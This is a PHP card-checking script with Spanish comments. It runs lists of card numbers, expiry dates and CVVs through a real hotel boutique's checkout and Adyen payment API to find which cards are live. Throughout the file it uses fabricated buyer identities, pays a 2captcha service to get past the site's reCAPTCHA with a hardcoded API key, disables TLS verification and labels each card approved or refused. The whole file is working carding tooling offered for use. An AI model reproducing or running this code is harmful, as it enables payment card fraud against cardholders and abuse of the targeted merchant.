<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// CONFIGURACIÓN
// ==============================
$CAPTCHA_API_KEY = "300200c245197d2f4b79d1c319a662f8"; // Tu API key de 2captcha
$RECAPTCHA_SITE_KEY = "6LeuX6kqAAAAAPUJ_HhZ6vT8lfObBJ36wdHuRnfj"; // Del JavaScript
$ADYEN_VERSION = "_0_1_25";

// ==============================
// FUNCIONES PRINCIPALES
// ==============================

function makeRequest($url, $data, $headers = [], $isJson = true) {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $postData = $isJson ? json_encode($data) : http_build_query($data);
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_TIMEOUT => 45,
        CURLOPT_CONNECTTIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip'
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error)
    ];
}

function solveRecaptchaV2($siteKey, $apiKey) {
    global $CAPTCHA_API_KEY;
    
    if (empty($apiKey) || $apiKey === "TU_API_KEY_DE_2CAPTCHA_AQUI") {
        throw new Exception("API key de 2captcha no configurada");
    }
    
    // Enviar CAPTCHA a resolver
    $postData = [
        'key' => $apiKey,
        'method' => 'userrecaptcha',
        'googlekey' => $siteKey,
        'pageurl' => 'https://boutique.shangri-la.com/food_checkout.php',
        'json' => 1,
        'soft_id' => 2975 // Soft ID de 2captcha
    ];
    
    $ch = curl_init('https://2captcha.com/in.php');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    if (!$result) {
        throw new Exception("Error al conectar con 2captcha");
    }
    
    $response = json_decode($result, true);
    
    if (!$response || !isset($response['status'])) {
        throw new Exception("Respuesta inválida de 2captcha");
    }
    
    if ($response['status'] == 1) {
        $captchaId = $response['request'];
        
        // Esperar solución (máximo 120 segundos)
        $maxWait = 120;
        $startTime = time();
        
        while (time() - $startTime < $maxWait) {
            sleep(5); // Esperar 5 segundos entre intentos
            
            $ch = curl_init("https://2captcha.com/res.php?key={$apiKey}&action=get&id={$captchaId}&json=1");
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false
            ]);
            
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (!$result) {
                continue;
            }
            
            $solution = json_decode($result, true);
            
            if ($solution && $solution['status'] == 1) {
                return $solution['request'];
            }
            
            // Si el CAPTCHA aún no está listo
            if ($solution && $solution['request'] == 'CAPCHA_NOT_READY') {
                continue;
            }
            
            // Si hay error
            if ($solution && isset($solution['request'])) {
                throw new Exception("Error de 2captcha: " . $solution['request']);
            }
        }
        
        throw new Exception("Tiempo de espera agotado para reCAPTCHA");
    } else {
        throw new Exception("Error al enviar CAPTCHA: " . (isset($response['request']) ? $response['request'] : 'Unknown error'));
    }
}

function validateCard($cc, $mes, $ano, $cvv) {
    // Validación básica
    if (strlen($cc) < 15 || strlen($cc) > 16) {
        return "Número de tarjeta inválido";
    }
    
    if ($mes < 1 || $mes > 12) {
        return "Mes inválido";
    }
    
    if (strlen($ano) == 2) {
        $ano = "20" . $ano;
    }
    
    // Validar fecha
    $current_year = date('Y');
    $current_month = date('n');
    if ($ano < $current_year || ($ano == $current_year && $mes < $current_month)) {
        return "Tarjeta expirada";
    }
    
    // Validar CVV
    $cardType = getCardType($cc);
    $expectedCvvLength = ($cardType == 'AMEX') ? 4 : 3;
    if (strlen($cvv) != $expectedCvvLength) {
        return "CVV inválido para " . $cardType;
    }
    
    return true;
}

function getCardType($cc) {
    $first_digit = substr($cc, 0, 1);
    $first_two = substr($cc, 0, 2);
    $first_four = substr($cc, 0, 4);
    
    if ($first_digit == '4') return "VISA";
    if ($first_digit == '5') return "MASTERCARD";
    if ($first_two == '34' || $first_two == '37') return "AMEX";
    if ($first_two >= '51' && $first_two <= '55') return "MASTERCARD";
    if (($first_two >= '30' && $first_two <= '36') || $first_two == '38') return "DINERS";
    if ($first_two == '35') return "JCB";
    if ($first_four == '6011' || $first_two == '65') return "DISCOVER";
    
    return "UNKNOWN";
}

function generateRandomUser() {
    $firstNames = ['John', 'David', 'Michael', 'Robert', 'William', 'James', 'Thomas', 'Christopher', 'Daniel', 'Matthew'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    
    return [
        'first_name' => $firstName,
        'last_name' => $lastName,
        'email' => strtolower($firstName) . '.' . strtolower($lastName) . rand(100, 999) . '@gmail.com',
        'phone' => '+852' . rand(50000000, 99999999)
    ];
}

// ==============================
// VALIDACIÓN DE ENTRADA
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">Error</span> ➔ No se recibió lista...'
    ]);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
    ]);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validar tarjeta
$validation = validateCard($cc, $mes, $ano, $cvv);
if ($validation !== true) {
    echo json_encode([
        'status' => 'error',
        'message' => $validation,
        'html' => '<span class="badge badge-danger">Error</span> ➔ ' . $validation
    ]);
    exit();
}

// Formatear fecha
if (strlen($mes) == 1) $mes = "0" . $mes;
if (strlen($ano) == 2) $ano = "20" . $ano;

// Determinar tipo de tarjeta
$cardType = getCardType($cc);
$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
$expiryMasked = $mes . '/' . substr($ano, -2);

// ==============================
// FLUJO PRINCIPAL
// ==============================

try {
    // CONFIGURACIÓN DEL SITIO
    $client_id = "14";
    $promotion_id = "1";
    $api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
    $api_locale = "en";
    $payment_method = "adyen";
    $hotel_code = "ISL";
    
    // LOG INICIAL
    error_log("=== INICIANDO PROCESO PARA TARJETA: " . $cardMasked . " ===");
    
    // PASO 1: OBTENER SITE LOGIN TOKEN
    error_log("Paso 1: Obteniendo site_login_token");
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        throw new Exception("Error al conectar con el sitio: HTTP " . $site_result['http_code'] . " - " . $site_result['error']);
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!$site_response || !isset($site_response['site_login_token'])) {
        throw new Exception("No se pudo obtener token de acceso. Respuesta: " . substr($site_result['response'], 0, 200));
    }
    
    $site_login_token = $site_response['site_login_token'];
    error_log("✓ site_login_token obtenido: " . substr($site_login_token, 0, 10) . "...");
    
    // PASO 2: RESOLVER reCAPTCHA
    error_log("Paso 2: Resolviendo reCAPTCHA con 2captcha");
    $recaptchaToken = solveRecaptchaV2($RECAPTCHA_SITE_KEY, $CAPTCHA_API_KEY);
    error_log("✓ reCAPTCHA resuelto: " . substr($recaptchaToken, 0, 20) . "...");
    
    // PASO 3: CREAR ORDEN TEMPORAL
    error_log("Paso 3: Creando orden temporal");
    $checkout_init_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "hotel_code" => $hotel_code,
        "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
        "order_amount" => 100, // Monto mínimo
        "payment_method" => $payment_method
    ];
    
    $init_result = makeRequest($api_endpoint . "/checkout_init.php", $checkout_init_data);
    
    if (!$init_result['success']) {
        throw new Exception("Error al crear orden: " . $init_result['error']);
    }
    
    $init_response = json_decode($init_result['response'], true);
    
    if (!$init_response || !isset($init_response['order_number']) || !isset($init_response['order_token'])) {
        throw new Exception("Respuesta inválida al crear orden");
    }
    
    $order_number = $init_response['order_number'];
    $order_token = $init_response['order_token'];
    error_log("✓ Orden creada: #" . $order_number);
    
    // PASO 4: ENCRIPTAR DATOS DE TARJETA
    error_log("Paso 4: Encriptando datos de tarjeta");
    $adyen_encrypt_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => $order_number,
        "order_token" => $order_token,
        "card" => $cc,
        "month" => (int)$mes,
        "year" => $ano,
        "cvv" => $cvv,
        "adyen_key" => "", // El servidor proporcionará la clave
        "adyen_version" => $ADYEN_VERSION
    ];
    
    $encrypt_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $adyen_encrypt_data);
    
    $encryptedData = [];
    if ($encrypt_result['success']) {
        $encrypt_response = json_decode($encrypt_result['response'], true);
        if ($encrypt_response && isset($encrypt_response['encryptedCardNumber'])) {
            $encryptedData = [
                'encryptedCardNumber' => $encrypt_response['encryptedCardNumber'],
                'encryptedExpiryMonth' => $encrypt_response['encryptedExpiryMonth'],
                'encryptedExpiryYear' => $encrypt_response['encryptedExpiryYear'],
                'encryptedSecurityCode' => $encrypt_response['encryptedSecurityCode']
            ];
            error_log("✓ Datos de tarjeta encriptados exitosamente");
        }
    }
    
    // PASO 5: PREPARAR DATOS DE USUARIO
    $userData = generateRandomUser();
    
    // PASO 6: REALIZAR CHECKOUT COMPLETO
    error_log("Paso 5: Realizando checkout con pago");
    $checkout_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        "payment_method" => $payment_method,
        "first_name" => $userData['first_name'],
        "last_name" => $userData['last_name'],
        "email" => $userData['email'],
        "phone" => $userData['phone'],
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "123 Main Street",
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d", strtotime("+2 days")),
        "shipping_time" => "12:00 - 13:00",
        "order_remark" => "",
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        "card_type" => $cardType,
        "card_issuer" => $cardType,
        "country_id" => "",
        "region" => "1",
        "district_group" => "1",
        "district" => "1",
        "pickup_store" => "",
        "is_food_site" => "1",
        "order_type" => "express",
        "recaptcha_type" => "v2",
        "recaptcha_token" => $recaptchaToken,
        "order_number" => $order_number,
        "order_token" => $order_token
    ];
    
    // Añadir datos encriptados si están disponibles
    if (!empty($encryptedData)) {
        $checkout_data = array_merge($checkout_data, $encryptedData);
    }
    
    // También enviar datos directos (fallback)
    $checkout_data['card_number'] = $cc;
    $checkout_data['card_expiry_month'] = $mes;
    $checkout_data['card_expiry_year'] = $ano;
    $checkout_data['card_cvv'] = $cvv;
    
    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
    
    if (!$checkout_result['success']) {
        throw new Exception("Error en el proceso de checkout: HTTP " . $checkout_result['http_code'] . " - " . $checkout_result['error']);
    }
    
    $checkout_response = json_decode($checkout_result['response'], true);
    error_log("✓ Respuesta del checkout recibida");
    
    // ==============================
    // PROCESAR RESPUESTA
    // ==============================
    
    if (!$checkout_response) {
        throw new Exception("Respuesta inválida del servidor");
    }
    
    // Guardar respuesta para debugging
    error_log("Respuesta completa: " . json_encode($checkout_response));
    
    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            // ÉXITO - Pago autorizado
            $resultCode = isset($checkout_response['direct_post']['resultCode']) ? 
                         $checkout_response['direct_post']['resultCode'] : 'Authorised';
            
            $refusalReason = isset($checkout_response['direct_post']['refusalReason']) ? 
                           $checkout_response['direct_post']['refusalReason'] : '';
            
            if ($resultCode == 'Authorised') {
                $html = '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-success">SHANGRI-LA EXPRESS</span>';
                
                $data = [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'bin' => substr($cc, 0, 6),
                    'last4' => substr($cc, -4),
                    'order_number' => isset($checkout_response['display_order_number']) ? 
                                     $checkout_response['display_order_number'] : $order_number,
                    'amount' => isset($checkout_response['direct_post']['amount']) ? 
                               number_format($checkout_response['direct_post']['amount']/100, 2) . ' HKD' : '100.00 HKD',
                    'result_code' => $resultCode,
                    'user' => $userData['email']
                ];
                
                echo json_encode([
                    'status' => 'approved',
                    'message' => 'Pago autorizado',
                    'html' => $html,
                    'data' => $data
                ]);
                
            } elseif ($resultCode == 'Refused') {
                // RECHAZADO
                $html = '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">' . ($refusalReason ?: 'Rechazado') . '</span>';
                
                echo json_encode([
                    'status' => 'rejected',
                    'message' => $refusalReason ?: 'Tarjeta rechazada',
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'reason' => $refusalReason,
                        'result_code' => $resultCode
                    ]
                ]);
                
            } else {
                // OTRO RESULTADO
                $html = '<span class="badge badge-warning">⚠️ ' . $resultCode . '</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">' . ($refusalReason ?: 'Procesado') . '</span>';
                
                echo json_encode([
                    'status' => 'pending',
                    'message' => $resultCode . ($refusalReason ? ': ' . $refusalReason : ''),
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'result_code' => $resultCode,
                        'reason' => $refusalReason
                    ]
                ]);
            }
            
        } else {
            // ERROR EN LA RESPUESTA
            $errorMsg = isset($checkout_response['error']) ? $checkout_response['error'] : 'Error desconocido';
            
            // Manejar errores específicos
            if (strpos($errorMsg, 'reCAPTCHA') !== false) {
                $errorMsg = 'Error de verificación reCAPTCHA';
            } elseif (strpos($errorMsg, 'card') !== false) {
                $errorMsg = 'Error con la tarjeta: ' . $errorMsg;
            }
            
            $html = '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                   '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                   '<span class="badge badge-warning">' . $errorMsg . '</span>';
            
            echo json_encode([
                'status' => 'error',
                'message' => $errorMsg,
                'html' => $html,
                'data' => [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'reason' => $errorMsg
                ]
            ]);
        }
    } else {
        // RESPUESTA SIN STATUS
        $responseText = substr($checkout_result['response'], 0, 200);
        throw new Exception("Respuesta inesperada del servidor: " . $responseText);
    }
    
} catch (Exception $e) {
    // MANEJO DE ERRORES GLOBALES
    error_log("ERROR: " . $e->getMessage());
    
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-info">' . (isset($cardType) ? $cardType : 'Desconocido') . '</span> ➔ ' .
                 '<span class="badge badge-warning">' . $e->getMessage() . '</span>',
        'data' => [
            'card' => isset($cardMasked) ? $cardMasked : 'N/A',
            'expiry' => isset($expiryMasked) ? $expiryMasked : 'N/A',
            'error' => $e->getMessage(),
            'trace' => $e->getTraceAsString()
        ]
    ]);
}
?>